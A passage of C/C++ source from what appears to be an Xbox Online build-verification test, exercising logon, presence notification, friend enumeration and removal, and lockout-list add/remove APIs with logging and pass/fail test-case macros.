			WaitForSingleObject(hEvent, dwWaitTimeLeft);

		hrContinue = XOnlineTaskContinue(hTask);

		// Update the poll-counter
		++dwInternalPollCounter;

		if (XONLINETASK_S_RUNNING != hrContinue)	//if hrDoWorks is not XONLINETASK_S_RUNNING(0x0)
		{	
		 	if (XONLINETASK_S_SUCCESS == hrContinue)	//if hrDoWorks is XONLINETASK_S_SUCCESS(0x1)
			{
				if(pfCompleted)
				{
					*pfCompleted = TRUE;
				}
			}
		  	else if (FAILED(hTask))
		    	{
		        	hr = hrContinue;
		    	}

			if(fCloseOnComplete)
			{
				XOnlineTaskClose(hTask);
			}	
		    	
		    break;
		}		

		if(dwMaxWaitTime != INFINITE)
		{
			// See if we have gone beyond the maximum allowed time
			dwCurrentTime = GetTickCount();
			if(dwCurrentTime < dwLastTime)
			{
				dwCurrentDuration = ((MAXDWORD - dwLastTime) + dwCurrentTime);
			}
			else
			{
				dwCurrentDuration = (dwCurrentTime - dwLastTime);
			}
			
			if(dwCurrentDuration >= dwWaitTimeLeft)
			{
				DbgPrint("Async operation didn't complete within %u ms\n", dwMaxWaitTime);
				hr = E_FAIL;
				goto Exit;
			}
			
			dwWaitTimeLeft -= dwCurrentDuration;
			dwLastTime = dwCurrentTime;
		}
	} while(TRUE);

Exit:
	if(pdwPollCounter)
		*pdwPollCounter = dwInternalPollCounter;

	return hr;
}

//==================================================================================
// XOnlineLogonWrapper
//----------------------------------------------------------------------------------
//
// Description: XOnlineLogon wrapper code stolen from dev tests
//
// Arguments:
//	HANDLE				hLog				Handle to logging subsystem
//	HANDLE				hEvent				Event for Xbox Online task
//	PXONLINETASK_HANDLE	phLogon				Pointer that receives a handle to the Xbox Online service
//	BYTE				bLogonControllers	Byte whose low order 4 bits store which controllers are logging in
//	DWORD*          	pServices			Pointer to services for which credentials are desired
//	DWORD				cServices			Number of services
//	DWORD				dwMaxWaitTime		Maximum number of seconds to allow for logon to complete
//
// Returns: Passes back async completion result
//==================================================================================
HRESULT XOnlineLogonWrapper(HANDLE hLog, HANDLE hLogonEvent, PXONLINETASK_HANDLE phLogon, BYTE bLogonControllers, DWORD* pServices, DWORD cServices, DWORD dwMaxWaitTime)
{
	XONLINE_USER		*pLocalUsersArray;
	DWORD				dwNumLocalUsers = 0;
	HRESULT				hr = S_OK;
	DWORD				dwStartTime = 0, dwCurrentTime = 0, dwElapsedTime = 0, dwResultsCounter = 0;
	BYTE				bCurrentController = 0;
	HRESULT 			hrContinue;
	TCHAR 				szMsg[128];
	
	// Get local users (we assume that the hard-drive has been populated)
	pLocalUsersArray =  (XONLINE_USER *) LocalAlloc(LPTR,XONLINE_MAX_STORED_ONLINE_USERS * sizeof(XONLINE_USER));

    if(pLocalUsersArray)        
	    hr = XOnlineGetUsers( pLocalUsersArray, &dwNumLocalUsers );
    else
    {
        xLog(hLog, XLL_INFO, "Memory Allocation Fail");
        hr = E_FAIL;
        goto Exit;
    }

	if (FAILED(hr))
	{
		xLog(hLog, XLL_INFO, "Getting users from hard-drive failed with 0x%08x", hr);
		hr = E_FAIL;
		goto Exit;
	}

	if(dwNumLocalUsers < XONLINE_MAX_LOGON_USERS)
	{
		OutputDebugString(TEXT("Not enough users stored on hard-drive to run friend tests!"));
		xLog(hLog, XLL_INFO, "%u users necessary to run friend tests, but only %u found on hard-drive",
			XONLINE_MAX_LOGON_USERS, dwNumLocalUsers);
		hr = E_FAIL;
		goto Exit;
	}

	g_dwNumLoggedOnUsers = 0;
	memset(g_LoggedOnUsers, 0, sizeof(g_LoggedOnUsers));

	// Log users in for the requested controllers
	for(bCurrentController = 0; bCurrentController < XONLINE_MAX_LOGON_USERS; ++bCurrentController)
	{
		if(bLogonControllers & (0x000000001 << bCurrentController))
		{
			memcpy(g_LoggedOnUsers + bCurrentController, pLocalUsersArray + bCurrentController, sizeof(XONLINE_USER));
			++g_dwNumLoggedOnUsers;
		}
	}

    LocalFree(pLocalUsersArray);
    
	// Initialize services
	xLog(hLog, XLL_INFO, "Logging into %u services with %u users", cServices, g_dwNumLoggedOnUsers);
	hr = XOnlineLogon(g_LoggedOnUsers, pServices, cServices, hLogonEvent, phLogon);
	if (FAILED(hr))
        goto Exit;

	dwElapsedTime = 0;
	dwStartTime = GetTickCount();

	xLog(hLog, XLL_INFO, "Waiting for logon to complete");

	// Pump until logon succeeds (PARTIAL_RESULTS flag set) or fails (DONT_CONTINUE flag set)
	do
	{
		if( WaitForSingleObject( hLogonEvent, dwMaxWaitTime) != WAIT_OBJECT_0 )
		{
			xLog(hLog, XLL_INFO, "Waiting for logon event failed!");
			hr = E_FAIL;
			goto Exit;
		}

		hrContinue = XOnlineTaskContinue(*phLogon);
	} while ( XONLINETASK_S_RUNNING == hrContinue );		//while hrDoWorks is XONLINETASK_S_RUNNING(0x0)	

	wsprintf(szMsg, TEXT("XBudBVTNamespace__XOnlineLogonWrapper: XOnlineTaskContinue returned %0x at last\n"),hrContinue);
	OutputDebugString(szMsg);

	hr = XOnlineLogonTaskGetResults(*phLogon);
	xLog(hLog, XLL_INFO, "Logon returned 0x%08x", hr);

	if (hr != XONLINE_S_LOGON_CONNECTION_ESTABLISHED)
	{
		xLog(hLog, XLL_INFO, "Logon failed asynchronously");
		hr = E_FAIL;
		goto Exit;
	}

	xLog(hLog, XLL_INFO, "Logon completed successfully");
	
Exit:

	return(hr);
}			

//==================================================================================
// XBudBVTDllMain
//----------------------------------------------------------------------------------
//
// Description: DLL entry
//
// Arguments:
//	HINSTANCE	hInstance		Handle to module
//	DWORD		dwReason		Indicates the reason for calling the function
//	LPVOID		lpContext		reserved
// Returns:
//	TRUE on success
//==================================================================================
BOOL WINAPI XBudBVTDllMain(IN HINSTANCE hInstance, IN DWORD     dwReason, IN LPVOID    lpContext)
{
	WSADATA WSAData;
	XNADDR xnaddr;
	DWORD dwElapsedTime = 0, dwStartTime = 0, dwCurrentTime = 0, dwResult = 0;

	// We'll initialize/delete the global critical section here
	switch(dwReason)
	{
	case DLL_PROCESS_ATTACH:
		XNetAddRef();
		
		dwElapsedTime = 0;
		dwStartTime = GetTickCount();
		
		// Wait until stack initialization completes
		do
		{
			dwCurrentTime = GetTickCount();
			
			// Calculate the elapsed time based on whether the time has wrapped around
			if(dwCurrentTime < dwStartTime)
				dwElapsedTime =  MAXDWORD - dwStartTime + dwCurrentTime;
			else
				dwElapsedTime = dwCurrentTime - dwStartTime;
			
			if(dwElapsedTime > 10000)
			{
				OutputDebugString(TEXT("Net stack failed to initialize"));
				return FALSE;
			}
			
			dwResult = XNetGetTitleXnAddr (&xnaddr);		
			
		} while (XNET_GET_XNADDR_PENDING == dwResult);

		WSAStartup(MAKEWORD(2, 2), &WSAData);
		g_hHeap = HeapCreate(0,0,0);
		break;
	case DLL_PROCESS_DETACH:
		WSACleanup();
		XNetRelease();
		HeapDestroy(g_hHeap);
		g_hHeap = NULL;
		break;
	default:
		break;
	}

    return TRUE;
}

BOOL RemoveAllFriends(HANDLE hLog, DWORD dwUserIndex, XONLINE_FRIEND *pFriendList)
{
	HRESULT hr = S_OK;
	DWORD dwCurrentFriend = 0, dwNumFriends = 0;

	for(dwCurrentFriend = 0; dwCurrentFriend < MAX_FRIENDS; ++dwCurrentFriend)
	{
		if(pFriendList[dwCurrentFriend].xuid.qwUserID != 0)
			++dwNumFriends;
	}

	for(dwCurrentFriend = 0; dwCurrentFriend < dwNumFriends; ++dwCurrentFriend)
	{

		xLog(hLog, XLL_INFO, "Removing friend %u from user %u", dwCurrentFriend + 1, dwUserIndex + 1);

		hr = XOnlineFriendsRemove(dwUserIndex, pFriendList + dwCurrentFriend);
		if(hr != S_OK)
		{
			xLog(hLog, XLL_FAIL, "XOnlineFriendsRemove failed unexpectedly");
			return FALSE;
		}
	}

	return TRUE;
}

BOOL RemoveAllLockoutlist(HANDLE hLog, DWORD dwUserIndex, DWORD dwNumLockoutUser, 
							PXONLINE_LOCKOUTUSER pLockoutUser)
{
	HRESULT hr = S_OK;
	DWORD dwCurrentFriend = 0, dwNumFriends = 0;

	for( DWORD ii = 0; ii < dwNumLockoutUser; ++ii)
	{

		xLog(hLog, XLL_INFO, "Removing lockout user %u from user %u", ii + 1, dwUserIndex + 1);

		hr = XOnlineLockoutlistRemove(dwUserIndex, pLockoutUser[ii].xuid);
		if(hr != S_OK)
		{
			xLog(hLog, XLL_INFO, "XOnlineLockoutlistRemove returned %0x", hr);
			xLog(hLog, XLL_FAIL, "XOnlineLockoutlistRemove failed unexpectedly");
			return FALSE;
		}
	}

	return TRUE;
}


DWORD DisplayFriendList(HANDLE hLog, DWORD dwNumFriends, XONLINE_FRIEND *pFriendList)
{
	DWORD dwCurrentFriend = 0;

	xLog(hLog, XLL_INFO, "List has %u friends", dwNumFriends);

	for(dwCurrentFriend = 0; dwCurrentFriend < dwNumFriends; ++dwCurrentFriend)
	{
		if(pFriendList[dwCurrentFriend].xuid.qwUserID != 0)
		{
			xLog(hLog, XLL_INFO, "%s 0x%016I64x (S 0x%08x;T 0x%08x;TI %u)",
				pFriendList[dwCurrentFriend].username,
				pFriendList[dwCurrentFriend].xuid.qwUserID,
				pFriendList[dwCurrentFriend].friendState,
				pFriendList[dwCurrentFriend].titleID,
				pFriendList[dwCurrentFriend].StateDataSize);
			xLog(hLog, XLL_INFO, "    Session: 0x%016I64x", pFriendList[dwCurrentFriend].sessionID);
		}
	}

	return dwNumFriends;
}

//==================================================================================
// XBudBVTStartTest
//----------------------------------------------------------------------------------
//
// Description: Test entry point
//
// Arguments:
//	HANDLE		hLog			Handle to logging subsystem
// Returns:
//	none
//==================================================================================

VOID WINAPI XBudBVTStartTest(IN HANDLE  hLog)
{
//	XONLINE_FRIENDS_RESULTS_ERROR friendError;
	XONLINETASK_HANDLE hLogonTask = NULL, hEnumGamesTask[XONLINE_MAX_LOGON_USERS] = {NULL,}, hGameOpTask = NULL, hLockoutTask = NULL;
	XONLINE_FRIEND *pCurrentFriendList = NULL, *pFriendListExpected;
	LPBYTE pFriendBuffers = NULL;
//	XONLINE_SERVICE ServicesArray[] =
//	{
//		{ XONLINE_MATCHMAKING_SERVICE, S_OK, NULL }
//	};
//	DWORD dwServices = 0;
	XNKID SessionID;
	DWORD dwUserIndex = 0, dwEventType = 0, dwCounter1 = 0, dwCounter2 = 0, dwNumFriends = 0, dwNumOfExpectedFriend, dwNumLockoutUsers;
	HRESULT hr = S_OK;
	HANDLE hLogonEvent = NULL, hFriendOpEvent = NULL;
	BYTE byStateData1[MAX_STATEDATA_SIZE], byStateData2[MAX_STATEDATA_SIZE];
	HRESULT 	hrContinue, hReturn;
	BOOL bExpectedResult = FALSE;
	DWORD dwStartTickCount;
	PXONLINE_LOCKOUTUSER pLockoutlist;
	SY_RESULT		nResult;

	hr = XOnlineStartup(NULL);
	Verify(hr == S_OK);
    
	pFriendBuffers = (LPBYTE)LocalAlloc(LPTR, sizeof(XONLINE_FRIEND) * MAX_FRIENDS * XONLINE_MAX_LOGON_USERS);
	if(!pFriendBuffers)
	{
		xLog(hLog, XLL_FAIL, "Couldn't allocate friend buffers");
		goto Exit;
	}

	memset(byStateData1, 0, MAX_STATEDATA_SIZE);
	memset(byStateData2, 0, MAX_STATEDATA_SIZE);
	memset(pFriendBuffers, 0, sizeof(XONLINE_FRIEND) * MAX_FRIENDS * XONLINE_MAX_LOGON_USERS);
	memset(&SessionID, 0, sizeof(SessionID));
	memset(hEnumGamesTask, 0, sizeof(hEnumGamesTask));
//	memset(&friendError, 0, sizeof(friendError));

	xSetOwnerAlias(hLog, "styoo");
    xSetComponent(hLog, "Online", "Friends - Client (O)");

	hLogonEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	hFriendOpEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	if(!hLogonEvent || !hFriendOpEvent)
	{
		xLog(hLog, XLL_FAIL, "Couldn't create events for friends BVT");
		goto Exit;
	}

#if SY_NEED_POPULATE_USERS	
	hr = COnlineAccounts::Instance()->PopulateUserAccountsHD(NULL, XONLINE_MAX_LOGON_USERS);
	if(hr != S_OK)
	{
		xLog(hLog, XLL_FAIL, "Populating user accounts failed.");
		goto Exit;
	}
#endif

#if SY_NEED_CREATE_USERS	
	hr = SY_CreateUserAccounts(XONLINE_MAX_LOGON_USERS);
	if(hr != S_OK)
	{
		xLog(hLog, XLL_FAIL, "Creating user accounts failed.");
		goto Exit;
	}
#endif
	



// Handle logging on to necessary services
//	dwServices = (sizeof(ServicesArray)/sizeof(XONLINE_SERVICE));

	hr = XOnlineLogonWrapper(hLog, hLogonEvent, &hLogonTask, 0x0F, NULL, 0, 300000);
//	hr = XOnlineLogonWrapper(hLog, hLogonEvent, &hLogonTask, 0x0F, ServicesArray, dwServices, 30000);
	if(hr != XONLINE_S_LOGON_CONNECTION_ESTABLISHED)
	{
		xLog(hLog, XLL_FAIL, "Failed logon.");
		goto Exit;
	}

	for(dwUserIndex = 0; dwUserIndex < XONLINE_MAX_LOGON_USERS; ++dwUserIndex)
	{
		xLog(hLog, XLL_INFO, "Logged on user %u is 0x%16I64x", dwUserIndex + 1, g_LoggedOnUsers[dwUserIndex].xuid.qwUserID);
	}

#if	BUG10049REGRESS	
//===================================================================	
	xSetFunctionName(hLog, "XOnlineNotificationSetState");
	START_TESTCASE("Set status of all friends as online/cloaked");
//===================================================================
	for(dwUserIndex = 0; dwUserIndex < XONLINE_MAX_LOGON_USERS; ++dwUserIndex)
	{
		xLog(hLog, XLL_INFO, "Setting state for user %u", dwUserIndex + 1);

		if(XOnlineNotificationSetState(dwUserIndex, XONLINE_FRIENDSTATE_FLAG_ONLINE | XONLINE_FRIENDSTATE_FLAG_CLOAKED, 
										SessionID, 0, NULL))
		{
			bExpectedResult = TRUE;
		}
		else
		{
			bExpectedResult = FALSE;
			FAIL_TESTCASE("XOnlineNotificationSetState returned FALSE")
			break;
		}
	}

	if( bExpectedResult )
	{
		PASS_TESTCASE("Set online state for all users")
	}
	else
	{
		FAIL_TESTCASE("XOnlineNotificationSetState failed unexpectedly")
	}
		
	
	END_TESTCASE
	xSetFunctionName(hLog, "");
#endif

//===================================================================	
	xSetFunctionName(hLog, "XOnlineNotificationSetState");
	START_TESTCASE("Set status of all friends as online");
//===================================================================
	for(dwUserIndex = 0; dwUserIndex < XONLINE_MAX_LOGON_USERS; ++dwUserIndex)
	{
		xLog(hLog, XLL_INFO, "Setting state for user %u", dwUserIndex + 1);

		if(XOnlineNotificationSetState(dwUserIndex, XONLINE_FRIENDSTATE_FLAG_ONLINE, SessionID, 0, NULL))
		{
			bExpectedResult = TRUE;
		}
		else
		{
			bExpectedResult = FALSE;
			FAIL_TESTCASE("XOnlineNotificationSetState returned FALSE")
			break;
		}
	}

	if( bExpectedResult )
	{
		PASS_TESTCASE("Set online state for all users")
	}
	else
	{
		FAIL_TESTCASE("XOnlineNotificationSetState failed unexpectedly")
	}
		
	
	END_TESTCASE
	xSetFunctionName(hLog, "");

//===================================================================	
	xSetFunctionName(hLog, "XOnlineNotificationSetUserData");
	START_TESTCASE("Set user data of all friends as online");
//===================================================================

	BYTE	byUserData[] = "abcxyz";
	XONLINETASK_HANDLE hTaskUserData = NULL;
	BOOL	fDone;
	
	for(dwUserIndex = 0; dwUserIndex < XONLINE_MAX_LOGON_USERS; ++dwUserIndex)
	{
		xLog(hLog, XLL_INFO, "Setting user data for user %u", dwUserIndex + 1);

		hr = XOnlineNotificationSetUserData(dwUserIndex, strlen((char*)byUserData), (PBYTE)byUserData, NULL, &hTaskUserData);
		
		if(SUCCEEDED(hr))
		{
			bExpectedResult = TRUE;
		}
		else
		{
			bExpectedResult = FALSE;
			xLog(hLog, XLL_INFO, "XOnlineNotificationSetUserData returned 0x%08x", hr);
			FAIL_TESTCASE("XOnlineNotificationSetUserData failed unexpectedly")
			break;
		}

		hr = PollTaskUntilComplete(hTaskUserData, NULL, ALLOWEDPUMPINGTIME, NULL, &fDone, FALSE);
		if(FAILED(hr))
		{
			bExpectedResult = FALSE;
			xLog(hLog, XLL_INFO, "Pumping XOnlineNotificationSetUserData returned 0x%08x", hr);
			FAIL_TESTCASE("Pumping XOnlineNotificationSetUserData failed asynchronously");
			break;
		}
		else if (!fDone)
		{
			bExpectedResult = FALSE;
			FAIL_TESTCASE("Pumping XOnlineNotificationSetUserData didn't complete within 30 seconds");
			break;
		}
		
	}

	if( bExpectedResult )
	{
		PASS_TESTCASE("Set online state for all users")
	}
	else
	{
		FAIL_TESTCASE("Setting online state for all users failed");
	}
	
	END_TESTCASE
	xSetFunctionName(hLog, "");


//===================================================================
	xSetFunctionName(hLog, "XOnlineNotificationIsPending");
	START_TESTCASE("Check the notification status for each user")
//===================================================================

	for(dwUserIndex = 0; dwUserIndex < XONLINE_MAX_LOGON_USERS; ++dwUserIndex)
	{
		xLog(hLog, XLL_INFO, "Checking notifications for user %u", dwUserIndex + 1);

		if(XOnlineNotificationIsPending(dwUserIndex, XONLINE_NOTIFICATION_TYPE_ALL))
			xLog(hLog, XLL_INFO, "Events pending!");
		else
			xLog(hLog, XLL_INFO, "No events pending");

		PUMP_CS_AND_EXIT_IF_FAILED
	}

	PASS_TESTCASE("Checked notifications for all users")

	END_TESTCASE
	xSetFunctionName(hLog, "");

//===================================================================
	xSetFunctionName(hLog, "XOnlineNotificationEnumerate");
	START_TESTCASE("Check if XOnlineNotificationEnumerate returns E_NOTIMPL ")
//===================================================================

	XONLINE_NOTIFICATION_MSG	NotifiMsg;
	XONLINETASK_HANDLE			hTaskNoficationEnum;

	if(E_NOTIMPL == XOnlineNotificationEnumerate(0, &NotifiMsg, sizeof(XONLINE_NOTIFICATION_MSG), 
													XONLINE_NOTIFICATION_TYPE_ALL, NULL, &hTaskNoficationEnum))
		PASS_TESTCASE("XOnlineNotificationEnumerate returned E_NOTIMPL")
	else
		FAIL_TESTCASE("XOnlineNotificationEnumerate didn't return E_NOTIMPL")
	PUMP_CS_AND_EXIT_IF_FAILED

	END_TESTCASE
	xSetFunctionName(hLog, "");

//===================================================================
	xSetFunctionName(hLog, "XOnlineFriendsEnumerate");
	START_TESTCASE("Enumerate friends for each user");
//===================================================================

	bExpectedResult = TRUE;
	for(dwUserIndex = 0; bExpectedResult && dwUserIndex < XONLINE_MAX_LOGON_USERS; ++dwUserIndex)
	{
		xLog(hLog, XLL_INFO, "Enumerating friends for user %u", dwUserIndex + 1);

		hr = XOnlineFriendsEnumerate(dwUserIndex, NULL, hEnumGamesTask + dwUserIndex);
		if(hr == S_OK)
		{
			bExpectedResult = TRUE;
		}
		else
		{
			FAIL_TESTCASE("XOnlineFriendsEnumerate failed unexpectedly")
			bExpectedResult = FALSE;
		}

		PUMP_CS_AND_EXIT_IF_FAILED
	}

	if(bExpectedResult)
	{
		nResult = PumpFriendTask(hLog, hLogonTask, 0, hEnumGamesTask, 0, 1, &hReturn);
		if(nResult == SY_STOPWHOLETEST)	// Pump LogonTask failed
		{
			xEndVariation(hLog);
			goto Exit;
		}
		else if(nResult == SY_STOPTESTCASE)
			bExpectedResult = FALSE;
	}

	if(bExpectedResult)
	{
		PASS_TESTCASE("Started enumerating friend lists of all users");
	}
	else
	{
		FAIL_TESTCASE("Starting enumerating friend lists of all users failed");
	}
	
	END_TESTCASE
	xSetFunctionName(hLog, "");

//===================================================================
	xSetFunctionName(hLog, "XOnlineFriendsGetLatest");
	START_TESTCASE("Get friend list for each user #1");
//===================================================================

	for(dwUserIndex = 0; dwUserIndex < XONLINE_MAX_LOGON_USERS; ++dwUserIndex)
	{
		xLog(hLog, XLL_INFO, "Getting friend list for user %u", dwUserIndex + 1);

		pCurrentFriendList = (PXONLINE_FRIEND) (pFriendBuffers + (dwUserIndex * sizeof(XONLINE_FRIEND) * MAX_FRIENDS));

		memset(pCurrentFriendList, 0, sizeof(XONLINE_FRIEND) * MAX_FRIENDS);

		dwNumFriends = XOnlineFriendsGetLatest(dwUserIndex, MAX_FRIENDS, pCurrentFriendList);

		DisplayFriendList(hLog, dwNumFriends, pCurrentFriendList);

		PUMP_CS_AND_EXIT_IF_FAILED
	}

	PASS_TESTCASE("Retrieved friend list for all users")

	END_TESTCASE
	xSetFunctionName(hLog, "");



//===================================================================
	xSetFunctionName(hLog, "XOnlineFriendsStartup");
	START_TESTCASE("Initializing friend operation handle");
//===================================================================

	hr = XOnlineFriendsStartup(hFriendOpEvent, &hGameOpTask);
	if(hr == S_OK)
	{
		bExpectedResult = TRUE;
	}
	else
	{
		bExpectedResult = FALSE;
	}

	if(bExpectedResult == TRUE)
	{
		PASS_TESTCASE("Initialized friend operation handle")
	}
	else
	{
		FAIL_TESTCASE("XOnlineFriendsStartup failed unexpectedly")
	}
	
	END_TESTCASE
	xSetFunctionName(hLog, "");

//===================================================================
	xSetFunctionName(hLog, "XOnlineLockoutlistStartup");
	START_TESTCASE("Initializing lockoutlist operation handle");
//===================================================================

	hr = XOnlineLockoutlistStartup(NULL, &hLockoutTask);
	if(hr == S_OK)
	{
		bExpectedResult = TRUE;
	}
	else
	{
		bExpectedResult = FALSE;
	}

	if(bExpectedResult == TRUE)
	{
		PASS_TESTCASE("Initialized lockoutlist operation handle")
	}
	else
	{
		FAIL_TESTCASE("XOnlineLockoutlistStartup failed unexpectedly")
	}
	
	END_TESTCASE
	xSetFunctionName(hLog, "");

#if 1
//===================================================================
	xSetFunctionName(hLog, "XOnlineLockoutlistAdd");
	START_TESTCASE("Add user2 in user1's Lockout list");
//===================================================================

	hr = XOnlineLockoutlistAdd(0,g_LoggedOnUsers[1].xuid, g_LoggedOnUsers[1].name);

	if(hr == S_OK)
	{
		PASS_TESTCASE("XOnlineLockoutlistAdd succeeded")
	}
	else
	{
		xLog(hLog, XLL_INFO, "XOnlineLockoutlistAdd returned %0x", hr);
		FAIL_TESTCASE("XOnlineLockoutlistAdd failed");
		bExpectedResult = FALSE;
	}
	END_TESTCASE
	xSetFunctionName(hLog, "");

//===================================================================
	xSetFunctionName(hLog, "XOnlineLockoutlistGet");
	START_TESTCASE("Check if user2 is in user1's Lockout list");
//===================================================================
	bExpectedResult = FALSE;
	dwNumLockoutUsers = 0;
	dwStartTickCount = GetTickCount();
	
	pLockoutlist = (PXONLINE_LOCKOUTUSER) LocalAlloc(0, MAX_LOCKOUTUSERS * sizeof(XONLINE_LOCKOUTUSER));

	memset(pLockoutlist, 0, MAX_LOCKOUTUSERS * sizeof(XONLINE_LOCKOUTUSER));

	while(!bExpectedResult && !IsTimeFinished(dwStartTickCount, ALLOWEDPUMPINGTIME))
	{
		bExpectedResult = TRUE;

		nResult = PumpFriendTask(hLog, hLogonTask, hGameOpTask, hEnumGamesTask, hLockoutTask, 0, &hReturn);
		if(nResult == SY_STOPWHOLETEST)	// Pump LogonTask failed
		{
			xEndVariation(hLog);
			goto Exit;
		}
		else if(nResult == SY_STOPTESTCASE)
		{
			bExpectedResult = FALSE;
			break;
		}
		
		if(bExpectedResult)
		{
			dwNumLockoutUsers = XOnlineLockoutlistGet( 0, MAX_LOCKOUTUSERS, pLockoutlist );

			bExpectedResult = IsLockoutUser(dwNumLockoutUsers, pLockoutlist, g_LoggedOnUsers[1].xuid);

		}

	}
	
	if(bExpectedResult)
	{
		PASS_TESTCASE("Found lockout user after adding")
	}
	else
	{
		FAIL_TESTCASE("Couldn't find lockout user after adding");
	}
	
	END_TESTCASE
	xSetFunctionName(hLog, "");

//===================================================================
	xSetFunctionName(hLog, "XOnlineLockoutlistRemove");
	START_TESTCASE("Remove all lockout list for user 1");
//===================================================================

	bExpectedResult = TRUE;

	if( RemoveAllLockoutlist(hLog, 0, dwNumLockoutUsers, pLockoutlist) )
	{
		bExpectedResult = TRUE;
	}
	else
	{
		bExpectedResult = FALSE;
	}			

	LocalFree(pLockoutlist);
	
	if(bExpectedResult)
	{
		PASS_TESTCASE("Removed all lockout list for user 1")
	}
	else
	{
		FAIL_TESTCASE("Couldn't remove lockout list");
	}
	
	END_TESTCASE
	xSetFunctionName(hLog, "");

//===================================================================
	xSetFunctionName(hLog, "XOnlineLockoutlistGet");
	START_TESTCASE("Checking if all users are removed from user1's Lockout list");
//===================================================================
	bExpectedResult = FALSE;
	dwStartTickCount = GetTickCount();
	
	pLockoutlist = (PXONLINE_LOCKOUTUSER) LocalAlloc(0, MAX_LOCKOUTUSERS * sizeof(XONLINE_LOCKOUTUSER));

	memset(pLockoutlist, 0, MAX_LOCKOUTUSERS * sizeof(XONLINE_LOCKOUTUSER));

	while(!bExpectedResult && !IsTimeFinished(dwStartTickCount, ALLOWEDPUMPINGTIME))
	{
		bExpectedResult = TRUE;

		nResult = PumpFriendTask(hLog, hLogonTask, hGameOpTask, hEnumGamesTask, hLockoutTask, 0, &hReturn);
		if(nResult == SY_STOPWHOLETEST)	// Pump LogonTask failed
		{
			xEndVariation(hLog);
			goto Exit;
		}
		else if(nResult == SY_STOPTESTCASE)
		{
			bExpectedResult = FALSE;
			break;
		}
		
		if(bExpectedResult)
		{
			dwNumLockoutUsers = XOnlineLockoutlistGet( 0, MAX_LOCKOUTUSERS, pLockoutlist );

			if(dwNumLockoutUsers == 0)
				bExpectedResult = TRUE;
			else
				bExpectedResult = FALSE;

		}

	}

	LocalFree(pLockoutlist);
	
	if(bExpectedResult)
	{
		PASS_TESTCASE("Confirmed all lockout users are gone for user1")
	}
	else
	{
		FAIL_TESTCASE("Fail to confirm all lockout users are gone for user1");
	}
	
	END_TESTCASE
	xSetFunctionName(hLog, "");

// Need to add codes to remove all lockoutlists	
#else
//===================================================================
	xSetFunctionName(hLog, "XOnlineLockoutlistGet");
	START_TESTCASE("Remove all Lockout list for user 2, 3 and 4");
//===================================================================
	bExpectedResult = TRUE;

	for(dwUserIndex = 1; bExpectedResult && dwUserIndex < XONLINE_MAX_LOGON_USERS; ++dwUserIndex)
	{
		bExpectedResult = GetAndRemoveAllLockoutlist(hLog, dwUserIndex);
	}

	if(bExpectedResult)
	{
		PASS_TESTCASE("Confirmed all lockout users are gone for user 2, 3 and 4")
	}
	else
	{
		FAIL_TESTCASE("Fail to confirm all lockout users are gone for user 2, 3 and 4");
	}


	BOOL GetAndRemoveAllLockoutlist(HANDLE hLog, DWORD dwUserIndex)
	{
		PXONLINE_LOCKOUTUSER	pLockoutlist;
		
		pLockoutlist = (PXONLINE_LOCKOUTUSER) LocalAlloc(0, MAX_LOCKOUTUSERS * sizeof(XONLINE_LOCKOUTUSER));

		memset(pLockoutlist, 0, MAX_LOCKOUTUSERS * sizeof(XONLINE_LOCKOUTUSER));

		dwNumLockoutUsers = XOnlineLockoutlistGet( 0, MAX_LOCKOUTUSERS, pLockoutlist );

		dwStartTickCount = GetTickCount();

		if( RemoveAllLockoutlist(hLog, dwUserIndex, dwNumLockoutUsers, pLockoutlist) )
		{
			bExpectedResult = TRUE;
		}
		else
		{
			xLog(hLog, XLL_INFO, "Fail in RemoveAllLockoutlist");
			return FALSE;
		}	

		while(dwNumLockoutUsers > 0 && !IsTimeFinished(dwStartTickCount, ALLOWEDPUMPINGTIME))
		{
			nResult = PumpFriendTask(hLog, hLogonTask, hGameOpTask, hEnumGamesTask, hLockoutTask, 0, &hReturn);
		if(nResult == SY_STOPWHOLETEST)	// Pump LogonTask failed
		{
			xEndVariation(hLog);
			goto Exit;
		}
		else if(nResult == SY_STOPTESTCASE)
			bExpectedResult = FALSE;
			dwNumLockoutUsers = XOnlineLockoutlistGet( 0, MAX_LOCKOUTUSERS, pLockoutlist );
		}

		LocalFree(pLockoutlist);

		if(dwNumLockoutUsers == 0)
			return TRUE;
		else
			return FALSE;
	}

	END_TESTCASE
	xSetFunctionName(hLog, "");

#endif

//===================================================================
	xSetFunctionName(hLog, "XOnlineFriendsRemove");
	START_TESTCASE("Remove all existing friends from each user");
//===================================================================

	bExpectedResult = TRUE;
	for(dwUserIndex = 0; bExpectedResult && dwUserIndex < XONLINE_MAX_LOGON_USERS; ++dwUserIndex)
	{
		pCurrentFriendList = (PXONLINE_FRIEND) (pFriendBuffers + (dwUserIndex * sizeof(XONLINE_FRIEND) * MAX_FRIENDS));


		if(RemoveAllFriends(hLog, dwUserIndex, pCurrentFriendList))
		{

			bExpectedResult = TRUE;
		}
		else
		{

			FAIL_TESTCASE("Couldn't remove friends");
			bExpectedResult = FALSE;
		}			
	}

	if(bExpectedResult)
	{
		PASS_TESTCASE("Removed initial friend lists")
	}
	else
	{
		FAIL_TESTCASE("Removing initial friend lists failed");
	}
	
	END_TESTCASE
	xSetFunctionName(hLog, "");


//===================================================================
	xSetFunctionName(hLog, "XOnlineFriendsGetLatest");
	START_TESTCASE("Get friend list for each user #2")
//===================================================================

	bExpectedResult = FALSE;
	dwStartTickCount = GetTickCount();
	
	while(!bExpectedResult && !IsTimeFinished(dwStartTickCount, ALLOWEDPUMPINGTIME))
	{
		bExpectedResult = TRUE;

		nResult = PumpFriendTask(hLog, hLogonTask, hGameOpTask, hEnumGamesTask, hLockoutTask, 2, &hReturn);
		if(nResult == SY_STOPWHOLETEST)	// Pump LogonTask failed
		{
			xEndVariation(hLog);
			goto Exit;
		}
		else if(nResult == SY_STOPTESTCASE)
		{
			bExpectedResult = FALSE;		
			break;
		}
		for(dwUserIndex = 0; bExpectedResult && dwUserIndex < XONLINE_MAX_LOGON_USERS; ++dwUserIndex)
		{
			xLog(hLog, XLL_INFO, "Getting friend list for user %u", dwUserIndex + 1);

			pCurrentFriendList = (PXONLINE_FRIEND) (pFriendBuffers + (dwUserIndex * sizeof(XONLINE_FRIEND) * MAX_FRIENDS));

			memset(pCurrentFriendList, 0, sizeof(XONLINE_FRIEND) * MAX_FRIENDS);

			dwNumFriends = XOnlineFriendsGetLatest(dwUserIndex, MAX_FRIENDS, pCurrentFriendList);

			if(dwNumFriends == 0)
			{
				bExpectedResult = TRUE;
			}
			else
			{
